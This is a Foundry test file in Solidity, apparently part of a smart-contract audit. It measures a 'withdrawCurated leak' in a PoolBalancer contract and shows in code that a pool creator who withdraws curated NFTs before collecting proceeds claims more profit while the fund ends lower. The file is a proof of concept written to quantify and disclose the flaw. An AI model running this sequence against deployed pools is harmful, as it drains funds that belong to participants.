// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {console} from "forge-std/Test.sol";
import {AddendumBase} from "./AddendumBase.sol";
import {PoolBalancer} from "../../../../src/PoolBalancer.sol";
import {IFWAPool} from "../../../../src/interfaces/External.sol";

/// Launch-scale magnitude of the M9 withdrawCurated leak, and confirmation that it is a NET extraction (creator ends
/// with more ETH and the fund ends lower), not just a relabel. Real coordinator->service->pool route.
contract M9Scale is AddendumBase {
    // Build a pool with `nShapes` 0.01 shapes + `nCurated` curated NFTs at `markup`, put it in the short regime with
    // accrued proceeds (one unreconciled real shape draw), balance pulled to reserve. Returns curated listing ids.
    function _shortBoard(PoolBalancer b, uint16 markup, uint256 nShapes, uint256 nCurated)
        internal
        returns (uint256[] memory curatedIds)
    {
        vm.prank(creator);
        b.configure(markup, one(D_001, nShapes));
        vm.deal(address(b), 50 ether);
        vm.prank(creator);
        b.open();
        upkeep(b);
        curatedIds = new uint256[](nCurated);
        for (uint256 i; i < nCurated; ++i) {
            curatedIds[i] = listNewCurated(b, 0.3 ether);
        }
        upkeep(b);
        require(b.admissionStatus() == 0, "not admitting");
        uint256 bal = address(b).balance;
        uint256 reserve = b.requiredReserve();
        if (bal > reserve) {
            vm.prank(creator);
            b.claimSurplus(bal - reserve, creator);
        }
        bool ok;
        for (uint256 w = 1; w <= 60 && !ok; ++w) {
            uint256 s = vm.snapshotState();
            drawReal(b, uint256(keccak256(abi.encode("sb", w))));
            // all curated must survive (draw must hit a shape)
            bool allIntact = true;
            for (uint256 i; i < nCurated; ++i) {
                (uint8 kind,, uint8 state,,) = b.items(curatedIds[i]);
                if (!(kind == 1 && state == 1)) allIntact = false;
            }
            if (allIntact) ok = true;
            else vm.revertToState(s);
        }
        require(ok, "could not hit a shape");
        require(fundVal(b) < b.requiredReserve(), "not short");
    }

    // Worst case: 100% markup, equal curated and shapes; withdraw ALL curated then collect. Report net extraction.
    function testWorstCaseNetLeak() public {
        PoolBalancer b = newBalancer();
        uint256 nShapes = 10;
        uint256 nCurated = 10;
        uint256[] memory cids = _shortBoard(b, 10_000, nShapes, nCurated);

        // A — honest: collect, then claim all profit.
        uint256 snap = vm.snapshotState();
        uint256 c0 = creator.balance;
        b.collectProceeds();
        uint256 profitHonest = b.profit();
        uint256 fundHonest = fundVal(b);
        if (profitHonest > 0) {
            vm.prank(creator);
            b.claimSurplus(profitHonest, creator);
        }
        uint256 gotHonest = creator.balance - c0;

        // B — withdraw ALL curated to the creator, then collect, then claim all profit.
        vm.revertToState(snap);
        uint256 c1 = creator.balance;
        for (uint256 i; i < nCurated; ++i) {
            vm.prank(creator);
            b.withdrawCurated(cids[i], creator);
        }
        b.collectProceeds();
        uint256 profitActed = b.profit();
        uint256 fundActed = fundVal(b);
        if (profitActed > 0) {
            vm.prank(creator);
            b.claimSurplus(profitActed, creator);
        }
        uint256 gotActed = creator.balance - c1;

        console.log("profit honest / acted (wei):", profitHonest, profitActed);
        console.log("fund   honest / acted (wei):", fundHonest, fundActed);
        console.log("ETH withdrawn honest / acted (wei):", gotHonest, gotActed);
        // Net leak: in B the creator claims strictly more profit, and the fund ends strictly lower, on identical
        // proceeds. (B also returns the curated NFTs, which the creator re-lists to continue; that costs gas but does
        // not refund the fund.)
        assertGt(profitActed, profitHonest, "scale: withdraw-all-curated books more profit");
        assertLt(fundActed, fundHonest, "scale: fund ends lower (net extraction)");
        console.log("extra profit extracted this cycle (wei):", profitActed - profitHonest);
    }

    // The packet's "Balanced" mix (20x0.01, 10x0.05, 2x0.1, 1x0.5 shapes, 7x0.02 packs, one 0.3 NFT) at 15% markup:
    // report the single-curated leak ratio (n small relative to board, so the lever is weak with one NFT).
    function testBalancedMixSingleCuratedLeak() public {
        PoolBalancer b = newBalancer();
        uint256 target = one(D_001, 20) | one(1, 10) | one(2, 2) | one(D_05, 1) | one(D_002, 7);
        vm.prank(creator);
        b.configure(1500, target); // 15% markup
        vm.deal(address(b), 50 ether);
        vm.prank(creator);
        b.open();
        upkeep(b);
        uint256 cid = listNewCurated(b, 0.3 ether);
        upkeep(b);
        require(b.admissionStatus() == 0, "not admitting");
        uint256 bal = address(b).balance;
        uint256 reserve = b.requiredReserve();
        if (bal > reserve) {
            vm.prank(creator);
            b.claimSurplus(bal - reserve, creator);
        }
        bool ok;
        for (uint256 w = 1; w <= 60 && !ok; ++w) {
            uint256 s = vm.snapshotState();
            drawReal(b, uint256(keccak256(abi.encode("bm", w))));
            (uint8 kind,, uint8 state,,) = b.items(cid);
            if (kind == 1 && state == 1) ok = true;
            else vm.revertToState(s);
        }
        require(ok, "could not hit a shape");
        if (fundVal(b) >= b.requiredReserve()) {
            console.log("Balanced mix: not short after one draw; leak needs more draws in flight");
            return;
        }
        uint256 snap = vm.snapshotState();
        b.collectProceeds();
        uint256 honest = b.profit();
        vm.revertToState(snap);
        vm.prank(creator);
        b.withdrawCurated(cid, creator);
        b.collectProceeds();
        uint256 acted = b.profit();
        console.log("Balanced-mix honest/acted profit (wei):", honest, acted);
        console.log("Balanced-mix single-curated extra (wei):", acted > honest ? acted - honest : 0);
    }
}
